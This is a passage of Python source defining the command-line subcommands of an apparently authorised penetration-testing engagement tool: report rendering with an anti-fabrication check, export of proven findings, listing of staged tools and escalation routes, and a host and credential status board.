    p_mssql.set_defaults(func=lambda a: _missing(p_mssql))

    p_report = sub.add_parser(
        "report", help="render the customer report (proven Findings + Observations)",
        description="Projects the engagement database into a report: exec summary + "
                    "proven Findings (with the captured PoC trail) and clearly-labelled "
                    "Observations (seen, not exploited), severity/CWE/remediation from the "
                    "KB. --proven-only drops the Observations; --check gates on "
                    "anti-fabrication; --cleanup writes the internal artifact manifest.")
    p_report.add_argument("-o", "--out", default="report", metavar="BASENAME",
                          help="output basename (default: report)")
    p_report.add_argument("--formats", default="md,docx,pdf",
                          help="which to emit: md,docx,pdf (default: all)")
    p_report.add_argument("--check", action="store_true",
                          help="anti-fabrication gate only (exit 2 on errors)")
    p_report.add_argument("--cleanup", action="store_true",
                          help="write the INTERNAL cleanup manifest instead of the report")
    p_report.add_argument("--proven-only", action="store_true",
                          help="only demonstrated compromises — omit the Observations")
    # retired: --all (observations are now in the report by default). Kept as a hidden,
    # no-op alias so existing scripts don't break — it was the old way to include them.
    p_report.add_argument("--all", action="store_true", help=argparse.SUPPRESS)
    p_report.add_argument("--force", action="store_true",
                          help="render even if the anti-fabrication check has errors")
    p_report.set_defaults(func=cmd_report)

    p_recce = sub.add_parser(
        "export-recce", help="fold proven findings back into recce (fieldkit-import JSON)",
        description="Emits the KB-enriched JSON recce imports with `recce "
                    "fieldkit-import`, so every proven finding lands back in recce's "
                    "workbook + report.")
    p_recce.add_argument("out", nargs="?", help="output file (default: recce_findings.json)")
    p_recce.add_argument("--all", action="store_true",
                         help="include unproven findings (default: proven only)")
    p_recce.set_defaults(func=cmd_export_recce)

    p_arsenal = sub.add_parser(
        "arsenal", help="what tools/exploits are staged, and what each route needs")
    ar_sub = p_arsenal.add_subparsers(dest="arsenal_command", metavar="<action>")
    ar_list = ar_sub.add_parser("list", help="list staged artifacts by category")
    ar_list.set_defaults(func=cmd_arsenal_list)
    ar_check = ar_sub.add_parser(
        "check", help="readiness: which privesc/evasion routes are ready vs need staging")
    ar_check.add_argument("--all", action="store_true", help="show every route, not just gaps")
    ar_check.set_defaults(func=cmd_arsenal_check)
    ar_find = ar_sub.add_parser("find", help="print the path to a staged artifact by name")
    ar_find.add_argument("name")
    ar_find.set_defaults(func=cmd_arsenal_find)
    ar_rules = ar_sub.add_parser(
        "rules", help="print the failure-classifier ruleset (how it reads tool output)")
    ar_rules.set_defaults(func=lambda a: (print(classify_mod.describe_rules()) or 0))
    p_arsenal.set_defaults(func=cmd_arsenal_list)  # bare `arsenal` = list

    p_status = sub.add_parser("status", help="the engagement board")
    p_status.add_argument("--hosts", action="store_true", help="list every host")
    p_status.add_argument("--creds", action="store_true", help="list every credential")
    p_status.set_defaults(func=cmd_status)

    return parser


def _missing(parser):
    parser.print_help(sys.stderr)
    return 2


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(argv)
    if not getattr(args, "func", None):
        parser.print_help(sys.stderr)
        return 2
    try:
        return args.func(args)
    except FieldkitError as exc:
        # Every operator-actionable failure lands here; anything else is a fieldkit bug.
        _err(str(exc))
        return 2
    except FileNotFoundError as exc:
        _err(f"{exc.filename}: no such file")
        return 2
    except sqlite3.Error as exc:
        # A locked/read-only/corrupt database is an operator problem, not a crash.
        _err(f"database error: {exc}")
        return 2
    except BrokenPipeError:  # pragma: no cover - `| head`
        return 0
    except KeyboardInterrupt:  # pragma: no cover - operator hit ^C
        _err("interrupted")
        return 130
